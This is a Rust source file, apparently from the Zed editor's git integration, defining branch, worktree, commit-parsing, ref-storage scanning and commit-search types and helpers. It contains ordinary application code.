use crate::commit::{CommitDiffObject, CommitDiffObjectKind, parse_git_diff_raw};
use crate::commit_search::{self, MergeFilter};
use crate::stash::GitStash;
use crate::status::{
    DiffTreeType, FileStatus, GitStatus, StatusCode, TrackedStatus, TreeDiff, TreeDiffStatus,
};
use crate::{Oid, RunHook, SHA256_HEX_LENGTH, SHORT_SHA_LENGTH};
use anyhow::{Context as _, Result, anyhow, bail};
use async_channel::Sender;
use collections::HashMap;
use futures::channel::oneshot;
use futures::future::BoxFuture;
use futures::io::BufWriter;
use futures::{AsyncWriteExt, FutureExt as _, select_biased};
use gpui::{AppContext as _, AsyncApp, BackgroundExecutor, SharedString, Task};
use parking_lot::Mutex;
use rope::Rope;
use schemars::JsonSchema;
use serde::Deserialize;
use smallvec::SmallVec;
use smol::io::{AsyncBufReadExt, AsyncReadExt, BufReader};
use text::LineEnding;

use std::borrow::Cow;
use std::collections::{BTreeMap, BTreeSet, HashSet};
use std::ffi::{OsStr, OsString};
use std::sync::atomic::AtomicBool;

use std::process::{ExitStatus, Output};
use std::str::FromStr;
use std::time::{Duration, Instant, SystemTime};
use std::{
    cmp::Ordering,
    path::{Path, PathBuf},
    sync::{Arc, LazyLock},
};
use sum_tree::MapSeekTarget;
use thiserror::Error;
use time::OffsetDateTime;
use util::command::{Stdio, new_command};
use util::paths::PathStyle;
use util::rel_path::RelPath;
use util::{ResultExt, paths};
use uuid::Uuid;

pub use askpass::{AskPassDelegate, AskPassResult, AskPassSession};

use crate::account::GitIdentity;

pub const REMOTE_CANCELLED_BY_USER: &str = "Operation cancelled by user";

/// Format string used in graph log to get initial data for the git graph
/// %H - Full commit hash
/// %P - Parent hashes
/// %D - Ref names
/// %x00 - Null byte separator, used to split up commit data
static GRAPH_COMMIT_FORMAT: &str = "--format=%H%x00%P%x00%D";

/// [`GRAPH_COMMIT_FORMAT`] for git before 2.2, which lacks `%D`; `%d` gives the same ref names
/// wrapped as ` (HEAD, main)`.
static LEGACY_GRAPH_COMMIT_FORMAT: &str = "--format=%H%x00%P%x00%d";

/// Used to get commits that match with a search
/// %H - Full commit hash
/// %an <%ae> - The author header, which a search for several authors checks each one against
static SEARCH_COMMIT_FORMAT: &str = "--format=%H%x00%an <%ae>";

/// Number of commits to load per chunk for the git graph.
pub const GRAPH_CHUNK_SIZE: usize = 1000;

/// Default value for the `git.worktree_directory` setting.
pub const DEFAULT_WORKTREE_DIRECTORY: &str = "../worktrees";

/// Which untracked files `git status` is asked to report.
///
/// Mirrors git's own `--untracked-files` values. Reporting every file inside an
/// untracked directory (`All`) is what Zed needs to colour individual entries in
/// the project panel, but it is also the most expensive mode on large trees.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum StatusUntrackedFiles {
    /// `--untracked-files=all`: report every file inside untracked directories.
    #[default]
    All,
    /// `--untracked-files=normal`: report untracked directories, but not their contents.
    Normal,
    /// `--untracked-files=no`: don't report untracked files at all.
    No,
}

impl StatusUntrackedFiles {
    fn as_git_argument(self) -> &'static str {
        match self {
            StatusUntrackedFiles::All => "--untracked-files=all",
            StatusUntrackedFiles::Normal => "--untracked-files=normal",
            StatusUntrackedFiles::No => "--untracked-files=no",
        }
    }
}

/// Given the git common directory (from `commondir()`), derive the original
/// repository's working directory.
///
/// For a standard checkout, `common_dir` is `<work_dir>/.git`, so the parent
/// is the working directory. For a git worktree, `common_dir` is the **main**
/// repo's `.git` directory, so the parent is the original repo's working directory.
///
/// Returns `None` if `common_dir` doesn't end with `.git` (e.g. bare repos),
/// because there is no working-tree root to resolve to in that case.
pub fn original_repo_path_from_common_dir(common_dir: &Path) -> Option<PathBuf> {
    if common_dir.file_name() == Some(OsStr::new(".git")) {
        common_dir.parent().map(|p| p.to_path_buf())
    } else {
        None
    }
}

fn linked_worktree_git_dir(worktree_path: &Path) -> Result<PathBuf> {
    let dot_git_path = worktree_path.join(".git");
    let git_file = std::fs::read_to_string(&dot_git_path)
        .with_context(|| format!("failed to read {}", dot_git_path.display()))?;
    let git_dir = git_file
        .strip_prefix("gitdir:")
        .context("worktree .git file missing gitdir pointer")?
        .trim();
    Ok(worktree_path.join(git_dir))
}

fn normalize_git_metadata_path(path: PathBuf) -> Result<PathBuf> {
    paths::normalize_lexically(&path)
        .map_err(|_| anyhow!("git metadata path escapes its filesystem root: {path:?}"))
}

/// Commit data needed for the git graph visualization.
#[derive(Debug, Clone)]
pub struct CommitData {
    pub sha: Oid,
    /// Most commits have a single parent, so we use a SmallVec to avoid allocations.
    pub parents: SmallVec<[Oid; 1]>,
    pub author_name: SharedString,
    pub author_email: SharedString,
    pub commit_timestamp: i64,
    pub subject: SharedString,
    pub message: SharedString,
}

#[derive(Debug)]
pub struct InitialGraphCommitData {
    pub sha: Oid,
    pub parents: SmallVec<[Oid; 1]>,
    pub ref_names: Vec<SharedString>,
}

impl InitialGraphCommitData {
    pub fn tag_names(&self) -> Vec<&str> {
        self.ref_names
            .iter()
            .filter_map(|ref_name| {
                let tag_name = ref_name.strip_prefix("tag: ")?;

                if tag_name.is_empty() {
                    return None;
                }

                Some(tag_name)
            })
            .collect()
    }
}

struct CommitDataRequest {
    sha: Oid,
    response_tx: oneshot::Sender<Result<CommitData>>,
}

pub struct CommitDataReader {
    request_tx: async_channel::Sender<CommitDataRequest>,
    _task: Task<()>,
}

impl CommitDataReader {
    pub async fn read(&self, sha: Oid) -> Result<CommitData> {
        let (response_tx, response_rx) = oneshot::channel();
        self.request_tx
            .send(CommitDataRequest { sha, response_tx })
            .await
            .map_err(|_| anyhow!("commit data reader task closed"))?;
        response_rx
            .await
            .map_err(|_| anyhow!("commit data reader task dropped response"))?
    }

    #[cfg(any(test, feature = "test-support"))]
    pub fn for_test(
        executor: BackgroundExecutor,
        resolve: impl 'static + Send + Sync + Fn(Oid) -> Result<CommitData>,
    ) -> Self {
        let (request_tx, request_rx) = smol::channel::bounded::<CommitDataRequest>(64);
        let resolve = Arc::new(resolve);
        let delay_executor = executor.clone();
        let task = executor.spawn(async move {
            while let Ok(CommitDataRequest { sha, response_tx }) = request_rx.recv().await {
                delay_executor.simulate_random_delay().await;
                response_tx.send(resolve(sha)).ok();
            }
        });

        Self {
            request_tx,
            _task: task,
        }
    }
}

fn parse_cat_file_commit(sha: Oid, content: &str) -> Option<CommitData> {
    let mut parents = SmallVec::new();
    let mut author_name = SharedString::default();
    let mut author_email = SharedString::default();
    let mut commit_timestamp = 0i64;
    let mut in_headers = true;
    let mut subject = None;
    let mut message_lines = Vec::new();

    for line in content.lines() {
        if in_headers {
            if line.is_empty() {
                in_headers = false;
                continue;
            }

            if let Some(parent_sha) = line.strip_prefix("parent ") {
                if let Ok(oid) = Oid::from_str(parent_sha.trim()) {
                    parents.push(oid);
                }
            } else if let Some(author_line) = line.strip_prefix("author ") {
                if let Some((name_email, _timestamp_tz)) = author_line.rsplit_once(' ') {
                    if let Some((name_email, timestamp_str)) = name_email.rsplit_once(' ') {
                        if let Ok(ts) = timestamp_str.parse::<i64>() {
                            commit_timestamp = ts;
                        }
                        if let Some((name, email)) = name_email.rsplit_once(" <") {
                            author_name = SharedString::from(name.to_string());
                            author_email =
                                SharedString::from(email.trim_end_matches('>').to_string());
                        }
                    }
                }
            }
        } else {
            if subject.is_none() {
                subject = Some(SharedString::from(line.to_string()));
            }
            message_lines.push(line);
        }
    }

    Some(CommitData {
        sha,
        parents,
        author_name,
        author_email,
        commit_timestamp,
        subject: subject.unwrap_or_default(),
        message: SharedString::from(message_lines.join("\n")),
    })
}

#[derive(Clone, Debug, Hash, PartialEq, Eq)]
pub struct Branch {
    pub is_head: bool,
    pub ref_name: SharedString,
    pub upstream: Option<Upstream>,
    pub most_recent_commit: Option<CommitSummary>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct BranchesScanResult {
    pub branches: Vec<Branch>,
    pub error: Option<SharedString>,
    /// What [`scan_ref_storage`] found next to the branch list; left empty by backends that do
    /// not read the ref files themselves.
    pub ref_storage: RefStorageScan,
}

impl From<Vec<Branch>> for BranchesScanResult {
    fn from(branches: Vec<Branch>) -> Self {
        Self {
            branches,
            error: None,
            ref_storage: RefStorageScan::default(),
        }
    }
}

/// How many refs a repository keeps as one file each ("loose") instead of in `packed-refs`.
///
/// Git reads every loose ref file when it lists refs, which on Windows costs a few seconds per
/// ten thousand refs; `git pack-refs --all` folds them into `packed-refs`.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct LooseRefCount {
    pub count: usize,
    /// `false` when counting stopped at a limit, so that `count` is only a lower bound.
    pub complete: bool,
}

/// What [`scan_ref_storage`] read from the ref files of a repository.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct RefStorageScan {
    /// `None` when the refs could not be counted at all.
    pub loose_refs: Option<LooseRefCount>,
    /// Changes whenever a tag may have been added, moved or deleted. `None` when that cannot be
    /// told, in which case callers have to assume the tags may have changed at any time.
    pub tags_fingerprint: Option<u64>,
}

/// Loose refs past this many are reported as "at least this many"; the count only decides
/// whether suggesting `git pack-refs` is worthwhile.
pub const LOOSE_REF_COUNT_LIMIT: usize = 10_000;
/// The time [`scan_ref_storage`] may take. It runs on every ref change, next to the branch list.
///
/// Packed refs take it a few milliseconds. The budget is for 30,000 loose tags, which took
/// 120-160 ms to walk on Windows and more under load: running out leaves the tags without a
/// fingerprint, and then they are listed again (seconds, on the same queue as staging and
/// committing) after every commit. The branch listing next to it already takes seconds then.
pub const REF_STORAGE_SCAN_BUDGET: Duration = Duration::from_millis(500);

/// Counts the loose ref files under `<common_dir>/refs` and fingerprints the tags from file
/// metadata alone, so that noticing a changed tag does not need a `git for-each-ref` over all of
/// them.
///
/// Every tag file is visited before anything else is counted, since a fingerprint that skipped
/// some would miss changes to them; the other refs are then counted up to `loose_ref_limit`.
/// Whatever is still unvisited when `time_budget` runs out is left out: the count becomes a
/// lower bound and, if the tags were not all seen, the fingerprint is `None`.
pub fn scan_ref_storage(
    common_dir: &Path,
    loose_ref_limit: usize,
    time_budget: Duration,
) -> RefStorageScan {
    let deadline = Instant::now() + time_budget;
    let refs_dir = common_dir.join("refs");
    let reftable_dir = common_dir.join("reftable");
    if reftable_dir.is_dir() {
        // The reftable backend keeps no loose files; its table list is rewritten on every ref
        // update, which over-reports tag changes but never misses one.
        return RefStorageScan {
            loose_refs: Some(LooseRefCount {
                count: 0,
                complete: true,
            }),
            tags_fingerprint: file_fingerprint(&reftable_dir.join("tables.list"))
                .map(|fingerprint| hash_one(&("reftable", fingerprint))),
        };
    }

    let tags_dir = refs_dir.join("tags");
    let mut tag_entries_sum: u64 = 0;
    let tags_walk = walk_loose_refs(&tags_dir, &[], usize::MAX, deadline, |path, metadata| {
        let modified = metadata
            .modified()
            .ok()
            .and_then(|modified| modified.duration_since(SystemTime::UNIX_EPOCH).ok())
            .map(|since_epoch| since_epoch.as_nanos());
        tag_entries_sum = tag_entries_sum.wrapping_add(hash_one(&(path, metadata.len(), modified)));
    });
    let tags_fingerprint = tags_walk.complete.then(|| {
        hash_one(&(
            tag_entries_sum,
            tags_walk.count,
            file_fingerprint(&common_dir.join("packed-refs")),
        ))
    });

    let other_refs_walk = if tags_walk.complete {
        walk_loose_refs(
            &refs_dir,
            &[tags_dir.as_path()],
            loose_ref_limit.saturating_sub(tags_walk.count),
            deadline,
            |_, _| {},
        )
    } else {
        LooseRefWalk {
            count: 0,
            complete: false,
        }
    };

    RefStorageScan {
        loose_refs: refs_dir.is_dir().then(|| LooseRefCount {
            count: tags_walk.count + other_refs_walk.count,
            complete: tags_walk.complete && other_refs_walk.complete,
        }),
        tags_fingerprint,
    }
}

struct LooseRefWalk {
    count: usize,
    complete: bool,
}

/// Visits the files below `root` (skipping the directories in `excluded`), stopping after
/// `limit` of them or at `deadline`. Lock files are git's transient writes, not refs.
fn walk_loose_refs(
    root: &Path,
    excluded: &[&Path],
    limit: usize,
    deadline: Instant,
    mut visit: impl FnMut(&Path, &std::fs::Metadata),
) -> LooseRefWalk {
    let mut walk = LooseRefWalk {
        count: 0,
        complete: true,
    };
    let mut pending_directories = vec![root.to_path_buf()];
    while let Some(directory) = pending_directories.pop() {
        let entries = match std::fs::read_dir(&directory) {
            Ok(entries) => entries,
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
            Err(error) => {
                log::debug!("cannot read {}: {error}", directory.display());
                walk.complete = false;
                continue;
            }
        };
        for entry in entries {
            if Instant::now() >= deadline {
                walk.complete = false;
                return walk;
            }
            let Ok(entry) = entry else {
                walk.complete = false;
                continue;
            };
            let Ok(file_type) = entry.file_type() else {
                walk.complete = false;
                continue;
            };
            let path = entry.path();
            if file_type.is_dir() {
                if !excluded.contains(&path.as_path()) {
                    pending_directories.push(path);
                }
                continue;
            }
            if path
                .extension()
                .is_some_and(|extension| extension == "lock")
            {
                continue;
            }
            if walk.count >= limit {
                walk.complete = false;
                return walk;
            }
            match entry.metadata() {
                Ok(metadata) => visit(&path, &metadata),
                Err(_) => walk.complete = false,
            }
            walk.count += 1;
        }
    }
    walk
}

fn file_fingerprint(path: &Path) -> Option<(u64, Option<u128>)> {
    let metadata = std::fs::metadata(path).ok()?;
    let modified = metadata
        .modified()
        .ok()
        .and_then(|modified| modified.duration_since(SystemTime::UNIX_EPOCH).ok())
        .map(|since_epoch| since_epoch.as_nanos());
    Some((metadata.len(), modified))
}

fn hash_one(value: &impl std::hash::Hash) -> u64 {
    use std::hash::{BuildHasher as _, BuildHasherDefault};
    BuildHasherDefault::<std::collections::hash_map::DefaultHasher>::default().hash_one(value)
}

impl Branch {
    pub fn name(&self) -> &str {
        self.ref_name
            .as_ref()
            .strip_prefix("refs/heads/")
            .or_else(|| self.ref_name.as_ref().strip_prefix("refs/remotes/"))
            .unwrap_or(self.ref_name.as_ref())
    }

    pub fn is_remote(&self) -> bool {
        self.ref_name.starts_with("refs/remotes/")
    }

    pub fn remote_name(&self) -> Option<&str> {
        self.ref_name
            .strip_prefix("refs/remotes/")
            .and_then(|stripped| stripped.split("/").next())
    }

    pub fn tracking_status(&self) -> Option<UpstreamTrackingStatus> {
        self.upstream
            .as_ref()
            .and_then(|upstream| upstream.tracking.status())
    }

    pub fn priority_key(&self) -> (bool, Option<i64>) {
        (
            self.is_head,
            self.most_recent_commit
                .as_ref()
                .map(|commit| commit.commit_timestamp),
        )
    }
}

#[derive(Clone, Debug, Hash, PartialEq, Eq)]
pub struct Worktree {
    pub path: PathBuf,
    pub ref_name: Option<SharedString>,
    // todo(git_worktree) This type should be a Oid
    pub sha: SharedString,
    pub is_main: bool,
    pub is_bare: bool,
}

/// Describes how a new worktree should choose or create its checked-out HEAD.
#[derive(Clone, Debug, Hash, PartialEq, Eq)]
pub enum CreateWorktreeTarget {
    /// Check out an existing local branch in the new worktree.
    ExistingBranch {
        /// The existing local branch to check out.
        branch_name: String,
    },
    /// Create a new local branch for the new worktree.
    NewBranch {
        /// The new local branch to create and check out.
        branch_name: String,
        /// The commit or ref to create the branch from. Uses `HEAD` when `None`.
        base_sha: Option<String>,
    },
    /// Check out a commit or ref in detached HEAD state.
    Detached {
        /// The commit or ref to check out. Uses `HEAD` when `None`.
        base_sha: Option<String>,
    },
}

impl CreateWorktreeTarget {
    pub fn branch_name(&self) -> Option<&str> {
        match self {
            Self::ExistingBranch { branch_name } | Self::NewBranch { branch_name, .. } => {
                Some(branch_name)
            }
            Self::Detached { .. } => None,
        }
    }
}

impl Worktree {
    /// Returns the branch name if the worktree is attached to a branch.
    pub fn branch_name(&self) -> Option<&str> {
        self.ref_name.as_ref().map(|ref_name| {
            ref_name
                .strip_prefix("refs/heads/")
                .or_else(|| ref_name.strip_prefix("refs/remotes/"))
                .unwrap_or(ref_name)
        })
    }

    /// Returns a display name for the worktree, suitable for use in the UI.
    ///
    /// If the worktree is attached to a branch, returns the branch name.
    /// Otherwise, returns the short SHA of the worktree's HEAD commit.
    pub fn display_name(&self) -> &str {
        self.branch_name()
            .unwrap_or(&self.sha[..self.sha.len().min(SHORT_SHA_LENGTH)])
    }

    pub fn directory_name(&self, name_anchor_path: Option<&Path>) -> String {
        if self.is_main {
            return "main worktree".to_string();
        }

        let dir_name = self
            .path
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or(self.display_name());

        if let Some(name_anchor_path) = name_anchor_path {
            let name_anchor_dir = name_anchor_path.file_name().and_then(|name| name.to_str());
            if name_anchor_dir == Some(dir_name) {
                if let Some(parent_name) = self
                    .path
                    .parent()
                    .and_then(|parent| parent.file_name())
                    .and_then(|name| name.to_str())
                {
                    return parent_name.to_string();
                }
            }
        }

        dir_name.to_string()
    }
}

pub fn parse_worktrees_from_str<T: AsRef<str>>(
    raw_worktrees: T,
    main_worktree_path: Option<&Path>,
) -> Vec<Worktree> {
    let mut worktrees = Vec::new();
    let normalized = raw_worktrees.as_ref().replace("\r\n", "\n");
    let entries = normalized.split("\n\n");
    for entry in entries {
        let mut path = None;
        let mut sha = None;
        let mut ref_name = None;

        let mut is_bare = false;

        for line in entry.lines() {
            let line = line.trim();
            if line.is_empty() {
                continue;
            }
            if let Some(rest) = line.strip_prefix("worktree ") {
                path = Some(rest.to_string());
            } else if let Some(rest) = line.strip_prefix("HEAD ") {
                sha = Some(rest.to_string());
            } else if let Some(rest) = line.strip_prefix("branch ") {
                ref_name = Some(rest.to_string());
            } else if line == "bare" {
                is_bare = true;
            }
            // Ignore other lines: detached, locked, prunable, etc.
        }

        if let (Some(path), Some(sha)) = (path, sha) {
            let path = PathBuf::from(path);
            let is_main =
                main_worktree_path.is_some_and(|main_worktree_path| path == main_worktree_path);
            worktrees.push(Worktree {
                path,
                ref_name: ref_name.map(Into::into),
                sha: sha.into(),
                is_main,
                is_bare,
            });
        }
    }

    worktrees
}

#[derive(Clone, Debug, Hash, PartialEq, Eq)]
pub struct Upstream {
    pub ref_name: SharedString,
    pub tracking: UpstreamTracking,
}

impl Upstream {
    pub fn is_remote(&self) -> bool {
        self.remote_name().is_some()
    }

    pub fn remote_name(&self) -> Option<&str> {
        self.ref_name
            .strip_prefix("refs/remotes/")
            .and_then(|stripped| stripped.split("/").next())
    }

    pub fn stripped_ref_name(&self) -> Option<&str> {
        self.ref_name.strip_prefix("refs/remotes/")
    }

    pub fn branch_name(&self) -> Option<&str> {
        self.ref_name
            .strip_prefix("refs/remotes/")
            .and_then(|stripped| stripped.split_once('/').map(|(_, name)| name))
    }
}

#[derive(Clone, Copy, Default)]
pub struct CommitOptions {
    pub amend: bool,
    pub signoff: bool,
    pub allow_empty: bool,
    pub no_verify: bool,
}

#[derive(Clone, Copy, Debug, Hash, PartialEq, Eq)]
pub enum UpstreamTracking {
    /// Remote ref not present in local repository.
    Gone,
    /// Remote ref present in local repository (fetched from remote).
    Tracked(UpstreamTrackingStatus),
}

impl From<UpstreamTrackingStatus> for UpstreamTracking {
    fn from(status: UpstreamTrackingStatus) -> Self {
        UpstreamTracking::Tracked(status)
    }
}

impl UpstreamTracking {
    pub fn is_gone(&self) -> bool {
        matches!(self, UpstreamTracking::Gone)
    }

    pub fn status(&self) -> Option<UpstreamTrackingStatus> {
        match self {
            UpstreamTracking::Gone => None,
            UpstreamTracking::Tracked(status) => Some(*status),
        }
    }
}

#[derive(Debug, Clone)]
pub struct RemoteCommandOutput {
    pub stdout: String,
    pub stderr: String,
}

impl RemoteCommandOutput {
    pub fn is_empty(&self) -> bool {
        self.stdout.is_empty() && self.stderr.is_empty()
    }
}

#[derive(Clone, Copy, Debug, Hash, PartialEq, Eq)]
pub struct UpstreamTrackingStatus {
    pub ahead: u32,
    pub behind: u32,
}

#[derive(Clone, Debug, Hash, PartialEq, Eq)]
pub struct CommitSummary {
    pub sha: SharedString,
    pub subject: SharedString,
    /// This is a unix timestamp
    pub commit_timestamp: i64,
    pub author_name: SharedString,
    pub has_parent: bool,
}

#[derive(Clone, Debug, Default, Hash, PartialEq, Eq)]
pub struct CommitDetails {
    pub sha: SharedString,
    pub message: SharedString,
    pub commit_timestamp: i64,
    pub author_email: SharedString,
    pub author_name: SharedString,
}

#[derive(Debug)]
pub struct CommitDiff {
    pub files: Vec<CommitFile>,
    pub is_shallow_boundary: bool,
}

#[derive(Clone, Debug, Default, Eq, PartialEq)]
pub struct FileHistoryChangedFileSets {
    pub file_sets: Vec<Vec<RepoPath>>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum CommitFileStatus {
    Added,
    Modified,
    Deleted,
}

#[derive(Debug)]
pub struct CommitFile {
    pub path: RepoPath,
    pub old_content: Option<Vec<u8>>,
    pub new_content: Option<Vec<u8>>,
    pub is_binary: bool,
}

impl CommitFile {
    pub fn status(&self) -> CommitFileStatus {
        match (&self.old_content, &self.new_content) {
            (None, Some(_)) => CommitFileStatus::Added,
            (Some(_), None) => CommitFileStatus::Deleted,
            _ => CommitFileStatus::Modified,
        }
    }
}

impl CommitDetails {
    pub fn short_sha(&self) -> SharedString {
        self.sha[..SHORT_SHA_LENGTH].to_string().into()
    }
}

/// Detects if content is binary by checking for NUL bytes in the first 8000 bytes.
/// This matches git's binary detection heuristic.
pub fn is_binary_content(content: &[u8]) -> bool {
    let check_len = content.len().min(8000);
    content[..check_len].contains(&0)
}

struct LoadedCommitObject {
    content: Vec<u8>,
    is_binary: bool,
}

async fn read_commit_blob<R: smol::io::AsyncBufRead + Unpin>(
    stdout: &mut R,
    info_line: &mut String,
    newline: &mut [u8; 1],
) -> Result<LoadedCommitObject> {
    info_line.clear();
    stdout.read_line(info_line).await?;

    // `--batch=%(objectsize)` prints just the size, while the plain `--batch` that git before
    // 1.8.4 is limited to prints `<object> <type> <size>`.
    let len = info_line
        .split_whitespace()
        .last()
        .and_then(|size| size.parse().ok())
        .with_context(|| format!("invalid object size output from cat-file {info_line}"))?;

    let mut bytes = vec![0; len];
    stdout.read_exact(&mut bytes).await?;
    stdout.read_exact(newline).await?;

    let is_binary = is_binary_content(&bytes);
    Ok(LoadedCommitObject {
        content: bytes,
        is_binary,
    })
}

async fn load_commit_object<R: smol::io::AsyncBufRead + Unpin>(
    object: Option<CommitDiffObject<'_>>,
    stdout: &mut R,
    info_line: &mut String,
    newline: &mut [u8; 1],
) -> Result<Option<LoadedCommitObject>> {
    match object {
        Some(object) if object.kind == CommitDiffObjectKind::Gitlink => {
            Ok(Some(LoadedCommitObject {
                content: format!("Subproject commit {}\n", object.oid).into_bytes(),
                is_binary: false,
            }))
        }
        Some(_) => Ok(Some(read_commit_blob(stdout, info_line, newline).await?)),
        None => Ok(None),
    }
}

async fn read_shallow_file(shallow_file_path: &Path) -> Result<Option<String>> {
    match smol::fs::read_to_string(shallow_file_path).await {
        Ok(contents) => Ok(Some(contents)),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(error) => Err(error).context("reading shallow file"),
    }
}

async fn is_shallow_boundary_commit(
    git: &GitBinary,
    shallow_file_path: &Path,
    commit: &str,
) -> Result<bool> {
    let Some(shallow_contents) = read_shallow_file(shallow_file_path).await? else {
        return Ok(false);
    };

    let oid = git
        .run(&["rev-parse", "--verify", &format!("{commit}^{{commit}}")])
        .await
        .context("resolving commit for shallow boundary check")?;
    Ok(shallow_contents
        .lines()
        .any(|line| line.trim() == oid.trim()))
}

#[derive(Debug, Clone, Hash, PartialEq, Eq)]
pub struct Remote {
    pub name: SharedString,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ResetMode {
    /// Reset the branch pointer, leave index and worktree unchanged (this will make it look like things that were
    /// committed are now staged).
    Soft,
    /// Reset the branch pointer and index, leave worktree unchanged (this makes it look as though things that were
    /// committed are now unstaged).
    Mixed,
    /// Reset the branch pointer, the index and the worktree, throwing uncommitted work away.
    ///
    /// Only `Repository::reset_to` (which goes through [`GitRepository::run_command`] and always
    /// confirms with the user first) produces this; [`GitRepository::reset`] serves the git
    /// panel's "uncommit", which never resets hard.
    Hard,
}

#[derive(Debug, Clone, Hash, PartialEq, Eq)]
pub enum FetchOptions {
    All,
    Unshallow,
    Remote(Remote),
}

impl FetchOptions {
    pub fn to_proto(&self) -> Option<String> {
        match self {
            FetchOptions::All | FetchOptions::Unshallow => None,
            FetchOptions::Remote(remote) => Some(remote.clone().name.into()),
        }
    }

    pub fn from_proto(remote_name: Option<String>, unshallow: bool) -> Self {
        if unshallow {
            return FetchOptions::Unshallow;
        }
        match remote_name {
            Some(name) => FetchOptions::Remote(Remote { name: name.into() }),
            None => FetchOptions::All,
        }
    }

    pub fn name(&self) -> SharedString {
        match self {
            Self::All => "Fetch all remotes".into(),
            Self::Unshallow => "Fetch missing history".into(),
            Self::Remote(remote) => remote.name.clone(),
        }
    }
}

impl std::fmt::Display for FetchOptions {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            FetchOptions::All => write!(f, "--all"),
            FetchOptions::Unshallow => write!(f, "--unshallow"),
            FetchOptions::Remote(remote) => write!(f, "{}", remote.name),
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Hash, Copy)]
pub enum LogOrder {
    #[default]
    DateOrder,
    TopoOrder,
    AuthorDateOrder,
    ReverseChronological,
}

impl LogOrder {
    pub fn as_arg(&self) -> &'static str {
        match self {
            LogOrder::DateOrder => "--date-order",
            LogOrder::TopoOrder => "--topo-order",
            LogOrder::AuthorDateOrder => "--author-date-order",
            LogOrder::ReverseChronological => "--reverse",
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Hash)]
pub enum LogSource {
    #[default]
    All,
    Branch(SharedString),
    Sha(Oid),
    Path(RepoPath),
}

impl LogSource {
    fn get_args(&self) -> Vec<Cow<'_, str>> {
        let mut args = match self {
            LogSource::All => vec![
                Cow::Borrowed("--ignore-missing"), // needed in case of unborn HEAD
                Cow::Borrowed("--branches"),
                Cow::Borrowed("--remotes"),
                Cow::Borrowed("--tags"),
                Cow::Borrowed("HEAD"),
            ],
            LogSource::Branch(branch) => vec![Cow::Borrowed(branch.as_str())],
            LogSource::Sha(oid) => vec![Cow::Owned(oid.to_string())],
            LogSource::Path(path) => vec![
                Cow::Borrowed("--follow"),
                Cow::Borrowed("--"),
                Cow::Borrowed(path.as_unix_str()),
            ],
        };
        // Without a terminator git cannot tell a branch named `docs/rewrite` from a
        // `docs/rewrite` directory in the working tree, and refuses the argument as
        // ambiguous. `Path` states its own separator before the path it passes.
        if !matches!(self, LogSource::Path(_)) {
            args.push(Cow::Borrowed("--"));
        }
        args
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct SearchCommitArgs {
    /// Text to look for in commit messages, or a sha prefix when it is 7 to 40 hex digits.
    pub query: SharedString,
    /// Keeps only commits whose author header (name or address) contains every one of these.
    pub authors: Vec<SharedString>,
    pub case_sensitive: bool,
    /// Keeps only these commits: the ones a `タグ:` condition's tags point at.
    pub commits: Option<Vec<Oid>>,
    /// A full branch ref; keeps the commits on it that the default branch does not have.
    pub branch: Option<SharedString>,
    /// Keeps the commits that changed this file or folder (a glob when it holds `*`).
    pub path: Option<SharedString>,
    /// Commit dates, in seconds since the epoch.
    pub since: Option<i64>,
    pub until: Option<i64>,
    /// Keeps the commits whose added or removed lines contain this text.
    pub change: Option<SharedString>,
    pub merges: MergeFilter,
    pub sha_prefix: Option<SharedString>,
}

impl SearchCommitArgs {
    /// The authors to narrow the search by, with the whitespace around them removed.
    ///
    /// An author filter that is only whitespace is refused rather than dropped: `--author=`
    /// matches every commit, so honouring it as "no author filter" would answer a search meant to
    /// be narrowed with the whole history instead. [`commit_search::parse_commit_search_query`]
    /// never builds one, but a request that arrived over RPC carries whatever the peer sent.
    pub fn author_filters(&self) -> Result<Vec<&str>> {
        self.authors
            .iter()
            .map(|author| {
                let author = author.trim();
                anyhow::ensure!(!author.is_empty(), i18n::t!("The author filter is empty."));
                Ok(author)
            })
            .collect()
    }

    /// Checks what a peer may have sent in the same spirit as [`Self::author_filters`]: a filter
    /// that is present must narrow the search, and nothing may reach git as an option.
    pub fn validate(&self) -> Result<()> {
        self.author_filters()?;
        if let Some(branch) = self.branch.as_deref() {
            anyhow::ensure!(
                commit_search::is_searchable_branch_ref(branch),
                i18n::t!("Branch \"{branch}\" cannot be used in a search.")
            );
        }
        if let Some(path) = self.path.as_deref() {
            anyhow::ensure!(
                commit_search::normalize_search_path(path).is_some(),
                i18n::t!(
                    "The file filter \"{path}\" names the whole repository, so it does not narrow the search."
                )
            );
        }
        if let Some(change) = self.change.as_deref() {
            anyhow::ensure!(
                !change.is_empty(),
                i18n::t!("The changed-text filter is empty.")
            );
        }
        if let Some(sha_prefix) = self.sha_prefix.as_deref() {
            anyhow::ensure!(
                (4..=40).contains(&sha_prefix.len())
                    && sha_prefix.bytes().all(|byte| byte.is_ascii_hexdigit()),
                i18n::t!("The sha filter \"{sha_prefix}\" is not hexadecimal.")
            );
        }
        Ok(())
    }

    /// Whether anything narrows the search. One that has nothing finds nothing rather than every
    /// commit.
    pub fn has_anything_to_match(&self) -> bool {
        !self.query.trim().is_empty()
            || !self.authors.is_empty()
            || self.commits.is_some()
            || self.branch.is_some()
            || self.path.is_some()
            || self.since.is_some()
            || self.until.is_some()
            || self.change.is_some()
            || self.merges != MergeFilter::Include
            || self.sha_prefix.is_some()
    }

    /// Whether the search needs more than a message text and one author, which is all a remote
    /// Zed from before the other filters understands.
    pub fn uses_filters_beyond_author(&self) -> bool {
        // Compared as a whole rather than field by field, so that a filter added later counts
        // without anyone remembering to list it here: missing it would let an older server
        // quietly widen the search.
        let older_server_search = SearchCommitArgs {
            query: self.query.clone(),
            authors: self.authors.iter().take(1).cloned().collect(),
            case_sensitive: self.case_sensitive,
            ..SearchCommitArgs::default()
        };
        *self != older_server_search
    }

